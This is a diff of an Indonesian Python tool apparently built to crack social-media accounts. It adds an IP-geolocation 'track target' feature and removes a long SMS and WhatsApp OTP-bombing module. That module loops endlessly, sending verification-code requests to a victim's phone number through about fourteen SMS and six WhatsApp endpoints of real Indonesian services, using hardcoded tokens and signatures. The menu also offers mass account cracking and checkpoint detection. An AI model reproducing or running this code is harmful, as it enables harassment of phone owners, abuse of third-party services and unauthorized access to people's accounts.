@@ -397,22 +397,26 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold white]Minimal Follow IG Gw tod',width=32,style=f"bold cyan"))
 	urut = []
-	urut.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/] ',width=42,style=f"bold cyan"))
-	urut.append(panel(f'[bold white][+[/][bold white]][/] [bold white]IG : [bold green]@kata.gua__[/]\n[bold white][+[/][bold white]][/] [bold white]Author : [bold green]RifaiXD[/]\n[bold white][+[/][bold white]][/] [bold white]Status : [bold green]Private[/][/] ',width=40,style=f"bold cyan"))
-	wa.print(Columns(urut))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
-	_____rifai___xd____ = input(f' ╰─  Pilih Menu Crack : ')
-	if _____rifai___xd____ in ['1','01']:
+	cetak(panel(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/] ',width=42,style=f"bold cyan"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]][/]\[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\[bold white][[bold green]05[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]][/]\[bold white][[bold green]06[/][bold white]][/] [bold white]Chek Hasil Crack [[bold green] ON [bold white]][/]\[bold white][[bold green]07[/][bold white]][/] [bold white]Crack Chekpoint Detector [[bold green] ON [bold white]][/]\[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
+	_____xyzon___xd____ = input(f' ╰─  Pilih Menu Crack : ')
+	if _____xyzon___xd____ in ['1','01']:
 		brayen_dump()
-	elif _____rifai___xd____ in ['2','02']:
+	elif _____xyzon___xd____ in ['2','02']:
 		dump_massal()
-	elif _____rifai___xd____ in ['3','03']:
+	elif _____xyzon___xd____ in ['3','03']:
+		crack_nama()
+	elif _____xyzon___xd____ in ['4','04']:
+		pengikut()
+	elif _____xyzon___xd____ in ['5','05']:
+		crack_file()
+	elif _____xyzon___xd____ in ['6','06']:
 		result()
-	elif _____rifai___xd____ in ['lainnya','Lainnya','LAINNYA']:
-		lainnya()
-	elif _____brayennn___xd____ in ['Bot','BOT','bot']:
-		bot()
-	elif _____brayennn___xd____ in ['0','00']:
+	elif _____xyzon___xd____ in ['7','07']:
+		file_cp()
+	elif _____xyzon___xd____ in ['7','07']:
+		lacakip()
+	elif _____xyzon___xd____ in ['0','00']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print(f' ╰─  {m}Sukses Logout+Hapus Cookies{x}')
@@ -424,6 +428,33 @@ def error():
 	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
 	time.sleep(4)
 	back() 
+#-----------------[ TRACK IP ]-----------------# 
+def lacakip():
+	link = input(f' [+]╰─ Masukan Ip : ')
+	url = 'http://ip-api.com/json/' + link
+	r = requests.get(url)
+	data = json.loads(r.text)
+	latitude = data['lat']
+	longitude = data['lon']
+	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
+	try:
+		request = requests.get(url)
+		response = request.json()
+	except (requests.ConnectionError):
+		print(" [+]╰─ Koneksi Error")
+		exit()
+	if response['status'] == 'success':
+		print('')
+		print(" [+]╰─ Alamat IP : " + response['query'])
+		print(" [+]╰─ Kota : " + response['city'])
+		print(" [+]╰─ Negara : " + response['country'])
+		print(" [+]╰─ Kode Negara : " + response['countryCode'])
+		print(" [+]╰─ Latitude : " + str(response['lat']))
+		print(" [+]╰─ Longitude : " + str(response['lon']))
+		print(" [+]╰─ ISP : " + response['isp'])
+		print(" [+]╰─ Link Google Maps :", google_maps_url)
+	else:
+		print(" [+]╰─ Alamat IP Yang Dimasukkan Salah")
 ###----------[ CRACK DARI KOMEN ]---------- ###
 def komen():
 	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
@@ -479,36 +510,6 @@ def pengikut():
 		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
 		time.sleep(3);exit()
 
-#----------------------[ MENU CRACK ]----------------------#
-def bot():
-	cetak(panel(f"[01] Cek Opsi Cp [[bold green] ON [bold white]]                  [03] Spam WhatsApp [[bold green] ON [bold white]]\n[02] Spam Sms [[bold green] ON [bold white]]                     [04] Kembali Ke Awal [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,8),style=f"bold white"))
-	bray = input(f' ╰─  Pilih Menu Crack : ')
-	if bray in(''):
-		print(' ╰─  Pilih Yang Bener Asu ');back()
-	if bray in('1','01'):
-		file_cp()
-	elif bray in('2','02'):
-		spam_sms()
-	elif bray in('3','03'):
-		spam_wa()
-	elif bray in('4','04'):
-		back()
-		
-#----------------------[ MENU CRACK V2 ]----------------------#
-def lainnya():
-	cetak(panel(f"[01] Crack Username [[bold green] ON [bold white]]                  [03] Crack File [[bold green] ON [bold white]]\n[02] Crack Followers [[bold green] ON [bold white]]                 [04] Kembali Ke Awal [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
-	bray = input(f' ╰─  Pilih Menu Crack : ')
-	if bray in(''):
-		print(' ╰─  Pilih Yang Bener Asu ');back()
-	if bray in('1','01'):
-		crack_nama()
-	elif bray in('2','02'):
-		pengikut()
-	elif bray in('3','03'):
-		crack_file()
-	elif bray in('4','04'):
-		back()
-
 #----------------------[ CRACK USERNAME ]----------------------#
 def crack_nama():
 	nama = []
@@ -548,538 +549,6 @@ def cari_nama(link):
 	else:
 	     print("\r")
 	
-#------------------[ DEFF SPAM SMS ]-------------------#
-
-agent = random.choice(
-		[
-			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
-			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
-			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
-			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
-	]
-)
-
-def process_data1():
-	sleep(0.10)
-	
-def spam_sms():
-	global nomor 
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─  Input No Hp : +62").replace("+62","")
-	if nomor == "":
-		pass
-	else:
-		while True:
-			for _ in track(range(100), description=f' ╰─  Sedang Spam...'):process_data1()
-			sxp_sms()
-
-class sxp_sms:
-
-	def __init__(self):
-		self.req = requests.Session()
-		self.main()
-
-	def sms_otp_1(self, no):
-		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
-			headers = {
-				  "accept": "application/json, text/plain, */*",
-				  "authorization": "undefined",
-				  "save-data": "on",
-				  "user-agent": agent,
-				  "content-type": "application/json;charset=UTF-8"
-				},
-			json = {
-				 "phone_number": f"+62{no}"
-			  }
-		).text
-
-	def sms_otp_2(self, no):
-		data = json.dumps({
-					"mobile": f"0{no}",
-					"noise": "1583590641573155574",
-					"request_time": "158359064157312",
-					"access_token": "11111"
-				   })
-		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
-			headers = {
-				    "accept": "text/html, application/xhtml+xml, application/json, */*",
-				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-				    "content-length": "166",
-				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-				    "origin": "https://h5.rupiahcepatweb.com",
-				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
-				    "sec-fetch-dest": "empty",
-				    "sec-fetch-mode": "cors",
-				    "sec-fetch-site": "same-site",
-				    "user-agent": agent
-				  },
-			data = {
-				 "data": data
-			   }
-		).text
-
-	def sms_otp_3(self, no):
-		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
-			headers = {
-				    "accept": "*/*",
-				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
-				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
-				    "user-agent": agent,
-				    "content-type": "application/json"
-				  },
-			json = {
-				 "grantType": "retry",
-				 "method": "sms",
-				 "phone": no,
-				 "language": "id"
-				}
-		).text
-
-	def sms_otp_4(self, no):
-		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
-			headers = {
-				    "user-agent": agent,
-				    "content-type": "application/json",
-				    "referer": "https://www.alodokter.com/login-alodokter",
-				    "accept": "application/json",
-				    "origin": "https://www.alodokter.com"
-				  },
-			json = {
-				 "user":{
-					  "phone": f"0{no}"
-					}
-				}
-		).text
-
-	def sms_otp_5(self, no):
-		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
-			headers = {
-				    "x-requested-with": "XMLHttpRequest",
-				    "user-agent": agent,
-				    "Referer": "https://www.kelaspintar.id/"
-				  },
-			data = {
-				 "user_mobile": no,
-				 "otp_type": "send_otp_reg",
-				 "mobile_code": "%2B62"
-				}
-		).text
-
-	def sms_otp_6(self, no):
-		aink_sanz = random.choice(
-						[
-							"Hallo Mantan",
-							"Hallo Bangsad",
-							"Hallo Sayang",
-							"Hallo Ripper",
-							"Hallo Ngab"
-						]
-					)
-		email = random.choice(
-					[
-						"nsnsmsmksksmsm@gmail.com",
-						"lavon.lockman@gmail.com",
-						"duane_mclaughlin38@gmail.com",
-						"alfreda.lindgren@gmail.com",
-						"leonardo_kuhlman@gmail.com",
-						"lyric51@gmail.com",
-						"devonte_littel@gmail.com",
-						"newell.kuhic@gmail.com"
-					]
-				)
-		pw = random.choice(
-					[
-						"mamsmms123",
-						"Wadepak1037",
-						"waifugw1011"
-					]
-				)
-		birth_date = random.choice(
-						[
-							"13/09/1999",
-							"04/02/2022",
-							"05/02/2022",
-							"05/02/2022",
-							"06/02/2022",
-							"10/02/2022"
-						]
-	)
-		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
-			json = {
-				"thor_customer":{
-						"name": aink_sanz,
-						"card_number": None,
-						"email_address": email,
-						"mobile_country_code": "+62",
-						"gender_id": "1",
-						"mobile_number": f"0{no}",
-						"mro": "",
-						"password": pw,
-						"birth_date": birth_date
-						}
-				},
-			headers = {
-					"Host": "www.matahari.com",
-					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
-					"origin": "https://www.matahari.com",
-					"user-agent": agent,
-					"content-type": "application/json",
-					"accept": "*/*",
-					"x-requested-with": "XMLHttpRequest",
-					"referer": "https://www.matahari.com/customer/account/create/",
-					"accept-encoding": "gzip, deflate, br",
-					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				}
-
-		).text
-
-	def sms_otp_7(self, no):
-		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
-			headers = {
-				    "Host": "api.duniagames.co.id",
-				    "content-length": "32",
-				    "accept": "application/json, text/plain, */*",
-				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
-				    "accept-language": "id",
-				    "user-agent": agent,
-				    "ciam-type": "FR",
-				    "content-type": "application/json",
-				    "origin": "https://duniagames.co.id",
-				    "sec-fetch-site": "same-site",
-				    "sec-fetch-mode": "cors",
-				    "sec-fetch-dest": "empty",
-				    "referer": "https://duniagames.co.id/",
-				    "accept-encoding": "gzip, deflate, br"
-				  },
-			json = {
-				 "phoneNumber": f"+62{no}"
-				}
-		).text
-
-	def sms_otp_8(self, no):
-		__req__ = self.req.post("https://harvestcakes.com/register",
-			headers = {
-				    "user-agent": agent,
-				    "Referer": "https://harvestcakes.com/register"
-				  },
-			data = {
-				 "phone": f"0{no}",
-				 "url": ""
-				}
-		).text
-
-	def sms_otp_9(self, no):
-		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
-			headers = {
-				    "Host": "identity-gateway.oyorooms.com",
-				    "consumer_host": "https://www.oyorooms.com",
-				    "accept-language": "id",
-				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
-				    "user-agent": agent,
-				    "Content-Type": "application/json",
-				    "accept": "*/*",
-				    "origin": "https://www.oyorooms.com",
-				    "referer": "https://www.oyorooms.com/login",
-				    "Accept-Encoding": "gzip, deflate, br"
-				  },
-			json = {
-				 "phone": f"0{no}",
-				 "country_code": "+62",
-				 "country_iso_code": "ID",
-				 "nod": "4",
-				 "send_otp": "true",
-				 "devise_role": "Consumer_Guest"
-				}
-		).text
-
-	def sms_otp_10(self, no):
-		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
-			json = {
-				"mobile_number": f"0{no}",
-				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
-				},
-			headers = {
-					"Host": "crp-app.stamps.co.id",
-					"content-type": "application/json; charset=utf-8",
-					"content-length": "106",
-					"accept-encoding": "gzip",
-					"User-Agent": agent
-			}
-		).text
-
-	def sms_otp_11(self, no):
-		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
-			headers = {
-				    "LPR-TIMESTAMP": "1603281035821",
-				    "Accept-Language": "id-ID",
-				    "LPR-BRAND": "Kredito",
-				    "LPR-PLATFORM": "android",
-				    "user-agent": agent,
-				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
-				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
-				    "Content-Type": "application/json; charset=UTF-8",
-				    "Content-Length": "79"
-				   },
-			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
-		).text
-
-	def sms_otp_12(self, no):
-		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
-			headers = {
-					"Host": "www.autofun.co.id",
-					"Connection": "keep-alive",
-					"Content-length": "84",
-					"accept": "*/*",
-					"user-agent": agent,
-					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-					"content-type": "application/json;charset=UTF-8",
-					"Origin": "https://www.autofun.co.id",
-					"X-Requested-With": "acr.browser.barebones",
-					"Sec-Fetch-Site": "same-origin",
-					"Sec-Fetch-Mode": "cors",
-					"Sec-Fetch-Dest": "empty",
-					"Referer": "https://www.autofun.co.id/mobil/datsun",
-					"Accept-Encoding": "gzip, deflate"
-				},
-			json = {
-					"phoneNum": f"62{no}",
-					"languageCode": "id-id",
-					"countryCode": "id",
-					"platform": 2
-			}
-		).text
-
-	def sms_otp_13(self, no):
-		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
-			json = {
-					"phone":"+62"+no
-				},
-			headers = {
-					"Host": "api.myfave.com",
-					"Connection": "keep-alive",
-					"x-user-agent": "Fave-PWA/v1.0.0",
-					"Origin": "https://m.myfave.com",
-					"user-agent": agent,
-					"content-type": "application/json",
-					"Accept": "*/*",
-					"Referer": "https://m.myfave.com/jakarta/auth",
-					"Accept-Encoding": "gzip, deflate, br",
-					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-			}
-		).text
-
-	def sms_otp_14(self, no):
-		nickname = random.choice(
-					  [
-					    "fahmi",
-					    "xzc0der",
-					    "bed3bah",
-					    "xmanz"
-					  ]
-					)
-		angka = random.randint(
-					111,
-					999
-				      )
-		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
-			headers = {
-				    "Host": "wong.kitabisa.com",
-				    "x-ktbs-platform-name": "pwa",
-				    "origin": "https://account.kitabisa.com",
-				    "x-ktbs-time": "1611020248",
-				    "user-agent": agent,
-				    "x-ktbs-api-version": "1.0.0",
-				    "accept": "application/json",
-				    "x-ktbs-client-name": "kanvas",
-				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
-				    "x-ktbs-client-version": "1.0.0",
-				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
-				    "version": "3.4.0",
-				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
-				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				  },
-			json = {
-				 "full_name": nickname+str(angka),
-				 "username": f"62{no}",
-				 "otp_type": "sms"
-				}
-		).text
-
-	def main(self):
-		self.sms_otp_1(nomor)
-		self.sms_otp_2(nomor)
-		self.sms_otp_3(nomor)
-		self.sms_otp_4(nomor)
-		self.sms_otp_5(nomor)
-		self.sms_otp_6(nomor)
-		self.sms_otp_7(nomor)
-		self.sms_otp_8(nomor)
-		self.sms_otp_9(nomor)
-		self.sms_otp_10(nomor)
-		self.sms_otp_11(nomor)
-		self.sms_otp_12(nomor)
-		self.sms_otp_13(nomor)
-		self.sms_otp_14(nomor)
-		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
-
-#------------------[ DEFF SPAM WA ]-------------------# 
-    
-def spam_wa():
-	global nomor
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─  Input No Hp : +62").replace("+62","")
-	if nomor == "":
-		pass
-	else:
-		while True:
-			for _ in track(range(100), description=f' ╰─  Sedang Spam...'):process_data1()
-			sxp_wa()
-			
-class sxp_wa:
-
-	def __init__(self):
-		self.req = requests.Session()
-		self.main()
-
-	def wa_otp_1(self, no):
-		nickname = random.choice(
-					  [
-					    "fahmi",
-					    "xzc0der",
-					    "bed3bah",
-					    "xmanz"
-					  ]
-					 )
-		angka = random.randint(
-					111,
-					999
-				       )
-		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
-			headers = {
-				    "Host": "wong.kitabisa.com",
-				    "x-ktbs-platform-name": "pwa",
-				    "origin": "https://account.kitabisa.com",
-				    "x-ktbs-time": "1611020248",
-				    "user-agent": agent,
-				    "x-ktbs-api-version": "1.0.0",
-				    "accept": "application/json",
-				    "x-ktbs-client-name": "kanvas",
-				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
-				    "x-ktbs-client-version": "1.0.0",
-				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
-				    "version": "3.4.0",
-				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
-				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				   },
-			json = {
-				 "full_name": nickname+str(angka),
-				 "username": f"0{no}",
-				 "otp_type": "whatsapp"
-				}
-		).text
-
-	def wa_otp_2(self, no):
-		__req__ = self.req.get(
-			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
-		).text
-
-	def wa_otp_3(self, no):
-		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
-			headers = {
-				    "Accept": "application/json",
-				    "X-APP-VERSION-NAME": "3.4.0",
-				    "X-APP-VERSION-CODE": "3399",
-				    "Content-Type": "application/json; charset=UTF-8",
-				    "Host": "api.bukuwarung.com",
-				    "Connection": "Keep-Alive",
-				    "Accept-Encoding": "gzip",
-				    "User-Agent": agent
-				   },
-			json = {
-				 "action": "LOGIN_OTP",
-				 "countryCode": "62",
-				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
-				 "method": "WA",
-				 "phone": no
-				}
-		).text
-
-	def wa_otp_4(self, no):
-		__req__ = self.req.post("https://evermos.com/api/client/request-code",
-			headers = {
-				    "user-agent": agent
-				  },
-			data = {
-				 "telephone": f"62{no}",
-				 "type": 0
-				}
-		).text
-
-	def wa_otp_5(self, no):
-		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
-			headers = {
-				    "Host": "wapi.ruparupa.com",
-				    "Connection": "keep-alive",
-				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
-				    "Accept": "application/json",
-				    "Content-Type": "application/json",
-				    "X-Company-Name": "odi",
-				    "user-agent": agent,
-				    "user-platform": "mobile",
-				    "X-Frontend-Type": "mobile",
-				    "Origin": "https://m.ruparupa.com",
-				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
-				    "Accept-Encoding": "gzip, deflate, br",
-				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				   },
-			json = {
-				 "phone": f"0{no}",
-				 "action": "register",
-				 "channel": "chat",
-				 "email": "",
-				 "customer_id": "0",
-				 "is_resend": 0
-				}
-		).text
-
-	def wa_otp_6(self, no):
-		headers = {
-			    "Connection": "keep-alive",
-			    "Accept": "application/json, text/javascript, */*; q=0.01",
-			    "Origin": "https://accounts.tokopedia.com",
-			    "X-Requested-With": "XMLHttpRequest",
-			    "user-agent": agent,
-			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-			    "Accept-Encoding": "gzip, deflate",
-			   }
-		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
-		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
-		data = {
-			 "otp_type": "116",
-			 "msisdn": no,
-			 "tk": search,
-			 "email": "",
-			 "original_param": "",
-			 "user_id": "",
-			 "signature": "",
-			 "number_otp_digit": "6",
-			}
-		__req__ = self.req.post(
-				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
-	   ).text
-
-	def main(self):
-		self.wa_otp_1(nomor)
-		self.wa_otp_2(nomor)
-		self.wa_otp_3(nomor)
-		self.wa_otp_4(nomor)
-		self.wa_otp_5(nomor)
-		self.wa_otp_6(nomor)
-		cetak(panel(f" Sukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
-		
 #-----------------[ CRACK FILE ]-----------------#
 def crack_file():
 	try:vin = os.listdir('DUMP')
